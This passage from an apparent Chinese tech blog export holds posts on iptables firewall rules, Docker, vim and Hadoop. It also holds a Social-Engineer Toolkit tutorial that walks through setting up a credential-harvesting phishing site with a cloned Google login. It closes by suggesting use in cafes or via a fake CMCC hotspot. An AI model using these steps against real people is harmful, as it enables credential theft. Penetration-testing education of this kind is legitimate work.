RETURN：防火墙停止执行当前链中的后续Rules，并返回到调用链(the calling chain)
&nbsp;
&nbsp;

<h2><strong>0x05 Iptables常见命令</strong></h2>

<hr />

&nbsp;
a) 1. 删除iptables现有规则
iptables –F
b) 2. 查看iptables规则
iptables –L（iptables –L –v -n）
c) 3. 增加一条规则到最后
iptables -A INPUT -i eth0 -p tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT
d) 4.添加一条规则到指定位置
iptables -I INPUT 2 -i eth0 -p tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT
e) 5. 删除一条规则
iptabels -D INPUT 2
f) 6.修改一条规则
iptables -R INPUT 3 -i eth0 -p tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT
g) 7. 设置默认策略
iptables -P INPUT DROP
h) 8.允许远程主机进行SSH连接
iptables -A INPUT -i eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT
i) 9.允许本地主机进行SSH连接
iptables -A OUTPUT -o eth0 -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INTPUT -i eth0 -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT
j) 10.允许HTTP请求
iptables -A INPUT -i eth0 -p tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT
k) 11.限制ping 192.168.146.3主机的数据包数，平均2/s个，最多不能超过3个
iptables -A INPUT -i eth0 -d 192.168.146.3 -p icmp --icmp-type 8 -m limit --limit 2/second --limit-burst 3 -j ACCEPT
l) 12.限制SSH连接速率(默认策略是DROP)
iptables -I INPUT 1 -p tcp --dport 22 -d 192.168.146.3 -m state --state ESTABLISHED -j ACCEPT
iptables -I INPUT 2 -p tcp --dport 22 -d 192.168.146.3 -m limit --limit 2/minute --limit-burst 2 -m state --state NEW -j ACCEPT
&nbsp;
&nbsp;

<h2><strong>0x06 如何正确配置iptables</strong></h2>

<hr />

&nbsp;
a) 1. 删除现有规则
iptables -F
b) 2. 配置默认链策略
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT DROP
c) 3. 允许远程主机进行SSH连接
iptables -A INPUT -i eth0 -p tcp –dport 22 -m state –state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp –sport 22 -m state –state ESTABLISHED -j ACCEPT
d) 4. 允许本地主机进行SSH连接
iptables -A OUTPUT -o eth0 -p tcp –dport 22 -m state –state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -i eth0 -p tcp –sport 22 -m state –state ESTABLISHED -j ACCEPT
e) 5. 允许HTTP请求
iptables -A INPUT -i eth0 -p tcp –dport 80 -m state –state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp –sport 80 -m state –state ESTABLISHED -j ACCEPT
&nbsp;
&nbsp;

<h2><strong>0x07 使用iptables抵抗常见攻击</strong></h2>

<hr />

&nbsp;
1.防止syn攻击
思路一：限制syn的请求速度（这个方式需要调节一个合理的速度值，不然会影响正常用户的请求）
iptables -N syn-flood
iptables -A INPUT -p tcp --syn -j syn-flood
iptables -A syn-flood -m limit --limit 1/s --limit-burst 4 -j RETURN
iptables -A syn-flood -j DROP
思路二：限制单个ip的最大syn连接数
iptables –A INPUT –i eth0 –p tcp --syn -m connlimit --connlimit-above 15 -j DROP
2. 防止DOS攻击
利用recent模块抵御DOS攻击
iptables -I INPUT -p tcp -dport 22 -m connlimit --connlimit-above 3 -j DROP
单个IP最多连接3个会话
iptables -I INPUT -p tcp --dport 22 -m state --state NEW -m recent --set --name SSH
只要是新的连接请求，就把它加入到SSH列表中
Iptables -I INPUT -p tcp --dport 22 -m state NEW -m recent --update --seconds 300 --hitcount 3 --name SSH -j DROP
5分钟内你的尝试次数达到3次，就拒绝提供SSH列表中的这个IP服务。被限制5分钟后即可恢复访问。
3. 防止单个ip访问量过大
iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j DROP
4. 木马反弹
iptables –A OUTPUT –m state --state NEW –j DROP
5. 防止ping攻击
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/m -j ACCEPT
个人见解，不足之处求指正。
6.禁止SSH
iptables -I INPUT -p tcp --dport 22 -j DROP
转自：http://drops.wooyun.org/tips/1424]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>267</wp:post_id>
		<wp:post_date><![CDATA[2015-10-22 13:25:20]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-10-22 05:25:20]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[iptables%e5%85%a5%e9%97%a8%e6%95%99%e7%a8%8b]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="iptables"><![CDATA[iptables]]></category>
		<category domain="post_tag" nicename="linux"><![CDATA[Linux]]></category>
		<category domain="category" nicename="%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f"><![CDATA[操作系统]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[164]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>社会工程学工具集Social-Engineer Toolkit基础使用教程</title>
		<link>https://www.nervgeek.com/2015/10/26/%e7%a4%be%e4%bc%9a%e5%b7%a5%e7%a8%8b%e5%ad%a6%e5%b7%a5%e5%85%b7%e9%9b%86social-engineer-toolkit%e5%9f%ba%e7%a1%80%e4%bd%bf%e7%94%a8%e6%95%99%e7%a8%8b/</link>
		<pubDate>Mon, 26 Oct 2015 11:21:43 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=276</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>关于社会工程学工具集Social-Engineer Toolkit （SET，以下简称SET）这玩意的名字相信各位也是知道一二了。SET和它的好基友Metasploit之间的亲密配合更是完美无缺，但是SET在国内的应用却不多。我想应该是它全英文的界面阻碍广大人民群众对它的爱。</strong>
本着有事没事都参一脚的精神，这篇文章只是基础性的简介，并没有全面的去介绍其各种玩法。望各位原谅。（当然不是为了2FB而来的）
<strong>首先是给各位SET下载地址</strong>

<pre class="prettyprint lang-html prettyprinted"><span class="pln">git clone https://github.com/trustedsec/social-engineer-toolkit/set/</span></pre>

我虚拟机用的kali,SET在这个位置。BT里面同样有。不过现在SET的更新方法和Metasploit一样是用git了。所以旧版BT可能更新比较麻烦
<a class="highslide-image" target="_blank"><img title="1.JPG" alt="" data-original="" /></a>
<!--more-->
当然我们在BT下也可来运行

<pre class="prettyprint lang-as3 prettyprinted"><span class="pln">root@bt</span><span class="pun">:~#</span><span class="pln"> cd </span><span class="pun">/</span><span class="pln">pentest</span><span class="pun">/</span><span class="pln">exploits</span><span class="pun">/</span><span class="kwd">set</span><span class="pun">/</span><span class="pln">
root@bt</span><span class="pun">:</span><span class="str">/pentest/</span><span class="pln">exploits</span><span class="pun">/</span><span class="kwd">set</span><span class="com">#</span><span class="pln">
root@bt</span><span class="pun">:</span><span class="str">/pentset/</span><span class="pln">exploits</span><span class="pun">/</span><span class="kwd">set</span><span class="com">#./set</span></pre>

运行界面如下，漂亮的界面
<a class="highslide-image" target="_blank"><img title="2.JPG" alt="" data-original="" /></a>
之后是选项环节
<a class="highslide-image" target="_blank"><img title="3.jpg" alt="" data-original="" /></a>

<pre class="prettyprint lang-html prettyprinted"><span class="pln">1、社会工程学攻击
2、快速追踪测试
3、第三方模块
4、升级软件
5、升级配置
6、帮助
99、退出</span></pre>

因为我们要看的是制作钓鱼网站，所以果断的选1
<a class="highslide-image" target="_blank"><img title="4.JPG" alt="" data-original="" /></a>
嗯，又是选项

<pre class="prettyprint lang-html prettyprinted"><span class="pln">1、鱼叉式网络钓鱼攻击
2、网页攻击
3、传染媒介式（俗称木马）
4、建立payloaad和listener
5、邮件群发攻击（夹杂木马啊payload的玩意发给你）
6、Arduino基础攻击
7、无线接入点攻击
8、二维码攻击（我喜欢）
9、Powershell攻击
10、第三反模块
99、返回上级</span></pre>

我们选择2，应为是钓鱼网站
<a class="highslide-image" target="_blank"><img title="5.jpg" alt="" data-original="" /></a>
依旧选项。。。。

<pre class="prettyprint lang-html prettyprinted"><span class="pln">1、java applet攻击（网页弹窗那种）
2、Metasploit 浏览器漏洞攻击
3、钓鱼网站攻击
4、标签钓鱼攻击
5、网站jacking攻击（这个真心不明白，好像也和java的攻击方式有些相同）
6、多种网站攻击方式
7、全屏幕攻击（不明所以的玩意，只能够对谷歌邮箱和脸书用）
99、返回上级</span></pre>

OK我们选择2
<a class="highslide-image" target="_blank"><img title="6.jpg" alt="" data-original="" /></a>
之后让你设置是使用1、网站模版，还是2、设置克隆网站，或是3、自己设计的网站
这个克隆网站的要求就是最好是静态页面而且有有POST返回的登录界面，现在的百度啊QQ啊163啊都对于克隆没用了，当然各位可以运用鬼斧神工的制作技巧做出网页来
为了继续，我就选择网络模版
<a class="highslide-image" target="_blank"><img title="7.jpg" alt="" data-original="" /></a>
这里是设置POST返回地址，写虚拟机的192.168.1.106
之后是选择网站模版，如果选择了克隆则提示输入要克隆的网址
<a class="highslide-image" target="_blank"><img title="8.jpg" alt="" data-original="" /></a>
我选择的是google的，之后一路确定，就会自动设置一切了
<a class="highslide-image" target="_blank"><img title="9.jpg" alt="" data-original="" /></a>
敲下回车后，会直接返回之前的选择界面，不过我们的钓鱼网站已经正式上线了。我们可以直接访问192.168.1.106看看
<a class="highslide-image" target="_blank"><img title="10.jpg" alt="" data-original="" /></a>
这就是我们的钓鱼网站，在我输入用户名Nekotest密码2333333后，可以看见转跳到了一个post.php
<a class="highslide-image" target="_blank"><img title="11.jpg" alt="" data-original="" /></a>
这个就是用于接受POST数据同时将页面转跳到正规页面的东西，之后我们访问硬盘的/var/www/目录，下面就是我们的钓鱼网站的全部
<a class="highslide-image" target="_blank"><img title="12.jpg" alt="" data-original="" /></a>
而那个harvester_xxx_XXXXXXX.txt就是记录的刚才我们输入的密码和用户名的东西了
<a class="highslide-image" target="_blank"><img title="13.jpg" alt="" data-original="" /></a>

<hr />

以上就是SET的大概，其中的和Metasploit联用同样也是十分的厉害。可以说这两玩意在内网可以算得上是王者一样的工具了。
就在某咖啡，某餐馆，甚至自己制作移动无线冒充CMCC都是十分好的方法。
以上，望各位菊苣还请多多发挥自己的想象来运用。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>276</wp:post_id>
		<wp:post_date><![CDATA[2015-10-26 19:21:43]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-10-26 11:21:43]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e7%a4%be%e4%bc%9a%e5%b7%a5%e7%a8%8b%e5%ad%a6%e5%b7%a5%e5%85%b7%e9%9b%86social-engineer-toolkit%e5%9f%ba%e7%a1%80%e4%bd%bf%e7%94%a8%e6%95%99%e7%a8%8b]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="set"><![CDATA[SET]]></category>
		<category domain="post_tag" nicename="social-engineer-toolkit"><![CDATA[Social-Engineer Toolkit]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e7%a4%be%e4%bc%9a%e5%b7%a5%e7%a8%8b%e5%ad%a6"><![CDATA[社会工程学]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[168]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Docker入门教程（一）介绍</title>
		<link>https://www.nervgeek.com/2015/11/04/docker%e5%85%a5%e9%97%a8%e6%95%99%e7%a8%8b%ef%bc%88%e4%b8%80%ef%bc%89%e4%bb%8b%e7%bb%8d/</link>
		<pubDate>Wed, 04 Nov 2015 01:08:25 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=306</guid>
		<description></description>
		<content:encoded><![CDATA[【编者的话】DockerOne组织翻译了Flux7的Docker入门教程，本文是系列入门教程的第一篇，介绍了Docker的基础概念以及Docker的安装。
Docker是一个新的容器化的技术，它轻巧，且易移植，号称“build once, configure once and run anywhere（译者注：这个就不翻译了，翻译出来味道就没了）”。本文是Flux7的Docker系列教程的第一部分。请和这份教程一起学习和理解Docker有什么优势以及如何更好地使用它。
让我们一起来学习Docker。
本文主要涉及Docker的基础知识：Docker的特征、理念以及如何安装使用Docker。

<h3>Docker 特征</h3>

Docker有不少有趣的功能，通过本教程相信你会更好地理解它们。Docker的特性主要包括以下几点：

<ul>
    <li>速度飞快以及优雅的隔离框架</li>
    <li>物美价廉</li>
    <li>CPU/内存的低消耗</li>
    <li>快速开/关机</li>
    <li>跨云计算基础构架</li>
</ul>

<!--more-->

<h3>Docker 组件与元素</h3>

Docker有三个组件和三个基本元素，读者可以快速浏览下面<a href="https://www.youtube.com/watch?v=gNP9vJ3gMDo&amp;feature=youtu.be">这个视频</a>来了解这些组建和元素，以及它们的关系。三个组件分别是：

<ul>
    <li><code>Docker Client</code> 是用户界面，它支持用户与<code>Docker Daemon</code>之间通信。</li>
    <li><code>Docker Daemon</code>运行于主机上，处理服务请求。</li>
    <li><code>Docker Index</code>是中央registry，支持拥有公有与私有访问权限的Docker容器镜像的备份。</li>
</ul>

三个基本要素分别是：

<ul>
    <li><code>Docker Containers</code>负责应用程序的运行，包括操作系统、用户添加的文件以及元数据。</li>
    <li><code>Docker Images</code>是一个只读模板，用来运行Docker容器。</li>
    <li><code>DockerFile</code>是文件指令集，用来说明如何自动创建Docker镜像。</li>
</ul>

&nbsp;

<div class="aw-upload-img-list active"><a href="https://www.nervgeek.com/wp-content/uploads/2016/01/df06de5302719fded1e0d7b93f3f4e4c.png" target="_blank" rel="lightbox" data-fancybox-group="thumb"><img class="img-polaroid" title="image-1.png" src="https://www.nervgeek.com/wp-content/uploads/2016/01/df06de5302719fded1e0d7b93f3f4e4c.png" alt="image-1.png" /></a></div>

在讨论Docker组件和基本要素如何交互之前，让我们来谈谈Docker的支柱。Docker使用以下操作系统的功能来提高容器技术效率：

<ul>
    <li><code>Namespaces</code> 充当隔离的第一级。确保一个容器中运行一个进程而且不能看到或影响容器外的其它进程。</li>
    <li><code>Control Groups</code>是LXC的重要组成部分，具有资源核算与限制的关键功能。</li>
    <li><code>UnionFS</code>（文件系统）作为容器的构建块。为了支持Docker的轻量级以及速度快的特性，它创建了用户层。</li>
</ul>

&nbsp;

<h3>如何把它们放在一起</h3>

运行任何应用程序，都需要有两个基本步骤：

<ol>
    <li>构建一个镜像。</li>
    <li>运行容器。</li>
</ol>

这些步骤都是从<code>Docker Client</code>的命令开始的。<code>Docker Client</code>使用的是Docker二进制文件。在基础层面上，<code>Docker Client</code>会告诉<code>Docker Daemon</code>需要创建的镜像以及需要在容器内运行的命令。当Daemon接收到创建镜像的信号后，会进行如下操作：

<h4>第1步：构建镜像</h4>

如前所述，<code>Docker Image</code>是一个构建容器的只读模板，它包含了容器启动所需的所有信息，包括运行程序和配置数据。
每个镜像都源于一个基本的镜像，然后根据Dockerfile中的指令创建模板。对于每个指令，在镜像上创建一个新的层面。
一旦镜像创建完成，就可以将它们推送到中央registry：<code>Docker Index</code>，以供他人使用。然而，<code>Docker Index</code>为镜像提供了两个级别的访问权限：公有访问和私有访问。你可以将镜像存储在私有仓库，Docker官网有私有仓库的套餐可以供你选择。总之，公有仓库是可搜索和可重复使用的，而私有仓库只能给那些拥有访问权限的成员使用。<code>Docker Client</code>可用于<code>Docker Index</code>内的镜像搜索。

<h4>第2步：运行容器</h4>

运行容器源于我们在第一步中创建的镜像。当容器被启动后，一个读写层会被添加到镜像的顶层。当分配到合适的网络和IP地址后，需要的应用程序就可以在容器中运行了。
如果你还是不太理解，先别急，在接下来的内容中我们将会和你分享很多的实战案例。
目前为止，我们已经介绍了Docker的基本概念，接下来，让我们一起安装Docker！

<h3>安装Docker：快速指南</h3>

下面让我们来看看如何在Ubuntu 12.04 LTS上安装Docker（译者注：在CentOS 6.5安装可以参考<a href="https://github.com/llitfkitfk/docker-tutorial-cn">这里</a>）：

<ol>
    <li>检查APT系统的HTTPS兼容性。如果usr/lib/apt/methods/https文件不存在，请安装<code>apt-transport-https</code>程序包。</li>
    <li>在本地添加Docker Repositor密钥。 Repository key: hkp://keyserver.ubuntu.com:80 --recv-keys 36A1D7869245C8950F966E92D8576A8BA88D21E9</li>
    <li>添加Docker Repository到APT源列表。</li>
    <li>安装lxc-Docker程序包。 <code>sudo apt-get update sudo apt-get install lxc-docker</code></li>
    <li>验证所安装的内容。 <code>sudo docker run -i -t ubuntu /bin/bash</code></li>
</ol>

<strong>原文链接：<a href="http://blog.flux7.com/blogs/docker/docker-tutorial-series-part-1-an-introduction">Part 1: Introduction</a>（翻译：<a href="https://github.com/llitfkitfk">田浩浩</a> 审校：李颖杰）转自：<a href="http://dockone.io/article/101">http://dockone.io/article/101</a></strong>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>306</wp:post_id>
		<wp:post_date><![CDATA[2015-11-04 09:08:25]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-11-04 01:08:25]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[docker%e5%85%a5%e9%97%a8%e6%95%99%e7%a8%8b%ef%bc%88%e4%b8%80%ef%bc%89%e4%bb%8b%e7%bb%8d]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
		<category domain="post_tag" nicename="docker"><![CDATA[Docker]]></category>
		<category domain="category" nicename="%e4%ba%91%e8%ae%a1%e7%ae%97"><![CDATA[云计算]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[217]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>解决Ubuntu下VI的上下左右出现ABCD等问题</title>
		<link>https://www.nervgeek.com/2015/11/23/c71ec2958cbe42d5311a9d9c40fef7d2/</link>
		<pubDate>Mon, 23 Nov 2015 09:53:59 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=315</guid>
		<description></description>
		<content:encoded><![CDATA[<p style="margin: 0px; padding: 0px; line-height: 26px; widows: 1; background-color: #ffffff;"><span style="font-family: 微软雅黑;"><span style="font-size: 18px;">依次执行以下两个命令即可解决</span><span style="font-size: 18px;">Ubuntu</span><span style="font-size: 18px;">下vi编辑器上下左右方向键变ABCD的问题。</span></span></p>

<p style="margin: 0px; padding: 0px; line-height: 26px; widows: 1; background-color: #ffffff;"><span style="font-size: 18px;"><span style="font-family: 微软雅黑;">一、sudo apt-get remove vim-common</span></span></p>

<p style="margin: 0px; padding: 0px; line-height: 26px; widows: 1; background-color: #ffffff;"><span style="font-size: 18px;"><span style="font-family: 微软雅黑;">二、sudo apt-get install vim</span></span></p>

&nbsp;

<div><a title="来自为知笔记(Wiz)" href="http://www.wiz.cn/i/c6fc016e">来自为知笔记(Wiz)</a></div>

&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>315</wp:post_id>
		<wp:post_date><![CDATA[2015-11-23 17:53:59]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-11-23 09:53:59]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[c71ec2958cbe42d5311a9d9c40fef7d2]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="bug"><![CDATA[Bug]]></category>
		<category domain="post_tag" nicename="ubuntu"><![CDATA[Ubuntu]]></category>
		<category domain="post_tag" nicename="vi"><![CDATA[Vi]]></category>
		<category domain="category" nicename="%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f"><![CDATA[操作系统]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[198]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>何为Hadoop？</title>
		<link>https://www.nervgeek.com/2015/11/23/%e4%bd%95%e4%b8%bahadoop%ef%bc%9f/</link>
		<pubDate>Mon, 23 Nov 2015 11:43:44 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=354</guid>
		<description></description>
		<content:encoded><![CDATA[<h1><strong>0x01 Hadoop运行的原理?</strong></h1>

hadoop主要由三方面组成:
1、HDFS
2、MapReduce
3、Hbase
Hadoop框架中最核心的设计就是：MapReduce和HDFS。MapReduce的思想是由Google的一篇论文所提及而被广为流传的， 简单的一句话解释MapReduce就是“任务的分解与结果的汇总”。HDFS是Hadoop分布式文件系统（Hadoop Distributed File System）的缩写 ，为分布式计算存储提供了底层支持。
MapReduce从它名字上来看就大致可以看出个缘由，两个动词Map和Reduce，“Map（展开）”就是将一个任务分解成为多个任 务，“Reduce”就是将分解后多任务处理的结果汇总起来，得出最后的分析结果。这不是什么新思想，其实在前面提到的多线程，多任务的设计就可以找到这种思想的影子。
不论是现实社会，还是在程序设计中，一项工作往往可以被拆分成为多个任务，任务之间的关系可以分为两种：一种是不相关的任务，可以并行执 行；另一种是任务之间有相互的依赖，先后顺序不能够颠倒，这类任务是无法并行处理的。回到大学时期，教授上课时让大家去分析关键路径，无非就是找最省时的 任务分解执行方式。在分布式系统中，机器集群就可以看作硬件资源池，将并行的任务拆分，然后交由每一个空闲机器资源去处理，能够极大地提高计算效率，同时 这种资源无关性，对于计算集群的扩展无疑提供了最好的设计保证。（其实我一直认为Hadoop的卡通图标不应该是一个小象，应该是蚂蚁，分布式计算就好比 蚂蚁吃大象，廉价的机器群可以匹敌任何高性能的计算机，纵向扩展的曲线始终敌不过横向扩展的斜线）。任务分解处理以后，那就需要将处理以后的结果再汇总起 来，这就是Reduce要做的工作。
&nbsp;
<!--more-->

<h1><strong>0x02 MapReduce的原理?</strong></h1>

Hadoop中的MapReduce是一个使用简易的软件框架，基于它写出来的应用程序能够运行在由上千个商用机器组成的大型集群上，并以一种可靠容错的式并 行处理上T级别的数据集。
一个MapReduce作业（job）通常会把输入的数据集切分为若干独立的数据块，由map任务（task）以完全并行的方式处理它们。框架会对map的输出先进行排序，然后把结果输入给reduce任务。通常作业的输入和输出都会被存储在文件系统中。整个框架负责任务的调度和监控，以及重新执行已经失败的任务。
通常，MapReduce框架和分布式文件系统是运行在一组相同的节点上的，也就是说，计算节点和存储节点通常在一起。这种配置允许框架在那些已经存好数据的节点上高效地调度任务，这可以使整个集群的网络带宽被非常高效地利用。
MapReduce框架由一个单独的master JobTracker和每个集群节点一个slave TaskTracker共同组成。master负责调度构成一个作业的所有任务，这些任务分布在不同的slave上，master监控它们的执行，重新执行已经失败的任务。而slave仅负责执行由master指派的任务
&nbsp;
&nbsp;

<h1><strong>0x03 HDFS存储的机制?</strong></h1>

<strong>HDFS的三个实体</strong>
<strong>数据块</strong>
每个磁盘都有默认的数据块大小,这是磁盘进行读写的基本单位.构建于单个磁盘之上的文件系统通过磁盘块来管理该文件系统中的块.该文件系统中的块一般为磁盘块的整数倍.磁盘块一般为512字节.HDFS也有块的概念,默认为64MB(一个map处理的数据大小).HDFS上的文件也被划分为块大小的多个分块,与其他文件系统不同的是,HDFS中小于一个块大小的文件不会占据整个块的空间.
HDFS用块存储带来的第一个明显的好处一个文件的大小可以大于网络中任意一个磁盘的容量,数据块可以利用磁盘中任意一个磁盘进行存储.第二个简化了系统的设计,将控制单元设置为块,可简化存储管理,计算单个磁盘能存储多少块就相对容易.同时也消除了对元数据的顾虑,如权限信息,可以由其他系统单独管理.
<strong>DataNode节点</strong>
DataNode是HDFS文件系统的工作节点,它们根据需要存储并检索数据块,受NameNode节点调度.并且定期向NameNode发送它们所存储的块的列表
<strong>NameNode节点</strong>
NameNode管理HDFS文件系统的命名空间,它维护着文件系统树及整棵树的所有的文件及目录.这些文件以两个文件形式永久保存在本地磁盘上(命名空间镜像文件和编辑日志文件).NameNode记录着每个文件中各个块所在的数据节点信息但并不永久保存这些块的位置信息,因为这些信息在系统启动时由数据节点重建.
没有NameNode,文件系统将无法使用.如提供NameNode服务的机器损坏,文件系统上的所有文件丢失,我们就不能根据DataNode的块来重建文件.因此,对NameNode的容错非常重要.第一种机制,备份那些组成文件系统元数据持久状态的文件.通过配置使NameNode在多个文件系统上保存元数据的持久状态或将数据写入本地磁盘的同时,写入一个远程挂载的网络文件系统.当然这些操作都是原子操作.第二种机制是运行一个辅助的NameNode,它会保存合并后的命名空间镜像的副本,并在Name/Node发生故障时启用.但是辅助NameNode保存.态总是滞后于主力节点,所以在主节点全部失效后难免丢失数据.在这种情况下,一般把存储在远程挂载的网络文件系统的数据复制到辅助NameNode并作为新的主NameNode运行
&nbsp;
